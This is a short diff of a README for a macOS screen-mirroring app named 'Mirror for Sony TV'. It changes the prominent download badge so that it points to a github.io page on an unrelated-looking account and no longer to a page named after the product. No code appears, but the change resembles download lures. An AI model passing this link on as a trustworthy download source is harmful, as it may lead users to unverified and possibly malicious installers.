@@ -3,7 +3,7 @@
 ![Mirror for Sony TV Hero](https://mac.eltima.com/images/upload/juststream/screenshot/js_mirroring_sony_big@2x.jpg)
 
 <div align="center" style="margin:12px 0 18px;">
-  <a href="http://mirror-for-sony-tv.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/Mirror">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_MIRROR_FOR_SONY_TV-royalblue?style=for-the-badge&logo=tv&logoColor=white" alt="Download Mirror for Sony TV for macOS">
   </a>
 </div>
